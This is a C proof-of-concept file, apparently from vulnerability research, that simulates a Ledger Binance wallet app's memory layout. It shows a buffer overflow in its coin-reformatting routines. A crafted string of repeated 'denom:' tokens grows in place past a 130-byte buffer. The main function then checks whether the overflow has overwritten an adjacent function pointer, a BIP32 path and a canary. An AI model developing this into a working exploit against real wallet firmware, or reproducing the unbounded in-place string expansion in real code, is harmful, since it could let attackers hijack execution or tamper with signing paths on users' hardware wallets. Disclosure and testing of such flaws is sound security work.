#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

// Mock definitions based on Ledger App Binance source code
#define MAX_CHARS_PER_VALUE_LINE 130
#define MAX_SCREEN_LINE_WIDTH 22
#define DECIMAL_SCALE 8
#define ZERO_FRACTION "00000000"

typedef struct {
    char *key;
    char *value;
    int16_t key_length;
    int16_t value_length;
    int16_t item_index;
    int16_t item_index_to_display;
    int16_t chunk_index;
} display_context_params_t;

// Simulation of the global memory layout in src/view_common.c and src/app_main.c
struct {
    // view_common.c globals
    char viewctl_DataKey[32]; // Not used in this PoC but part of layout
    char viewctl_DataValue[MAX_CHARS_PER_VALUE_LINE];
    char viewctl_Title[MAX_SCREEN_LINE_WIDTH];
    int viewctl_DetailsCurrentPage;
    int viewctl_DetailsPageCount;
    int viewctl_ChunksIndex;
    
    // Function pointers - CRITICAL TARGETS
    void (*viewctl_ehReady)(void);
    void (*viewctl_ehExit)(void);

    // app_main.c globals
    uint8_t viewed_bip32_depth;
    uint32_t viewed_bip32_path[5];
    
    char canary[16];
} mem;

void mock_ready_handler() { printf("[!] EXPLOTATION SUCCESS: ehReady hijacked!\n"); }
void safe_ready_handler() { printf("[-] Normal execution.\n"); }

// --- Implementation from src/fixed8.c ---
int fixed8_str_conv(char *output, char *input, char terminator) {
    size_t input_len = strlen(input);
    if (strrchr(output, '.')) return 0;
    char tmp[DECIMAL_SCALE + 1];
    tmp[DECIMAL_SCALE] = '\0';
    if (input_len <= DECIMAL_SCALE) {
        strcpy(tmp, input);
        output[0] = '0';
        output[1] = '.';
        strcpy(&output[2], ZERO_FRACTION);
        int add_decs = DECIMAL_SCALE - strlen(tmp);
        strcpy(&output[2 + add_decs], tmp);
        output[input_len + 2 + add_decs] = terminator;
        return 1;
    }
    int input_dec_offset = input_len - DECIMAL_SCALE;
    strcpy(tmp, &input[input_dec_offset]);
    output[input_dec_offset] = '.';
    strncpy(output, input, input_len - DECIMAL_SCALE);
    strcpy(&output[input_dec_offset + 1], tmp);
    output[input_len + 1] = terminator;
    return 1;
}

// --- Implementation from src/lib/transaction_parser.c ---
char *replace_word(char *str, char *word, char *subst) {
    int len  = strlen(str);
    int lena = strlen(word), lenb = strlen(subst);
    for (char* p = str; (p = strstr(p, word)); ++p) {
        if (lena != lenb)
            memmove(p+lenb, p+lena, len - (p - str) + lenb);
        memcpy(p, subst, lenb);
        len = strlen(str); // Update length for next iterations
    }
    return str;
}

char *replace_chrs(char *str, char *chrs, char *subst) {
    int16_t chrslen = strlen(chrs);
    char chr[2];
    chr[1] = '\0';
    for (int16_t i = 0; i < chrslen; i++) {
        int len  = strlen(str);
        int lensub = strlen(subst);
        chr[0] = *chrs;
        for (char* p = str; (p = strstr(p, chr)); ++p) {
            if (1 != lensub)
                memmove(p+lensub, p+1, len - (p - str) + lensub);
            memcpy(p, subst, lensub);
            len = strlen(str);
        }
        chrs++;
    }
    return str;
}

void reformat_coins(display_context_params_t *p) {
    replace_chrs(p->value, "[{}]\"", "");
    
    // UNSAFE EXPANSION: denom: (6) -> "         " (9). +3 bytes per match.
    replace_word(p->value, "denom:", "         ");

    char *comma;
    char *amount = p->value;
    while ((amount = strstr(amount, "amount:")) != NULL) {
        comma = strchr(amount, ',');
        if (!comma) break;
        *comma = '\0';
        // UNSAFE EXPANSION: fixed8_str_conv adds '.' and terminator. +2 bytes.
        fixed8_str_conv(amount + 7, amount + 7, ' ');
        *comma = ','; // Restore comma (simplified)
        amount = comma + 1;
    }

    replace_word(p->value, "amount:", "");
    replace_word(p->value, "  ", " ");
    replace_chrs(p->value, ",", ",  ");
}

int main() {
    memset(&mem, 0, sizeof(mem));
    strcpy(mem.viewctl_Title, "Original Title");
    mem.viewctl_ehReady = safe_ready_handler;
    mem.viewed_bip32_path[0] = 0x44; // Standard path
    strcpy(mem.canary, "SAFE_CANARY");

    // Craft a payload that is exactly 129 chars (the max update() allows)
    // Containing many "denom:" strings.
    // "denom:" is 6 chars. 126 / 6 = 21 matches.
    char payload[130];
    memset(payload, 0, sizeof(payload));
    for(int i=0; i<21; i++) strcat(payload, "denom:");
    
    // Load it into the global buffer
    strcpy(mem.viewctl_DataValue, payload);
    
    display_context_params_t ctx;
    ctx.value = mem.viewctl_DataValue;
    ctx.value_length = MAX_CHARS_PER_VALUE_LINE;

    printf("--- Ledger App Binance: Memory Corruption PoC (Production Accurate) ---\n\n");
    printf("[*] Buffer size: %d\n", MAX_CHARS_PER_VALUE_LINE);
    printf("[*] Initial State:\n");
    printf("    viewctl_DataValue: %s\n", mem.viewctl_DataValue);
    printf("    viewctl_Title: %s\n", mem.viewctl_Title);
    printf("    viewctl_ehReady: %p\n", (void*)mem.viewctl_ehReady);
    printf("    viewed_bip32_path[0]: 0x%x\n", mem.viewed_bip32_path[0]);

    printf("\n[*] Triggering reformat_coins()...\n");
    reformat_coins(&ctx);

    printf("\n[*] Post-Execution State:\n");
    printf("    viewctl_DataValue length: %zu\n", strlen(mem.viewctl_DataValue));
    
    if (strcmp(mem.viewctl_Title, "Original Title") != 0) {
        printf("[!] OVERFLOW DETECTED: viewctl_Title overwritten!\n");
    }
    
    if (mem.viewctl_ehReady != safe_ready_handler) {
        printf("[!] CRITICAL OVERFLOW: viewctl_ehReady hijacked! New value: %p\n", (void*)mem.viewctl_ehReady);
    }

    if (mem.viewed_bip32_path[0] != 0x44) {
        printf("[!] SECURITY BYPASS: viewed_bip32_path overwritten!\n");
    }

    if (strcmp(mem.canary, "SAFE_CANARY") != 0) {
        printf("[!] VULNERABILITY CONFIRMED: Canary overwritten!\n");
    }

    return 0;
}
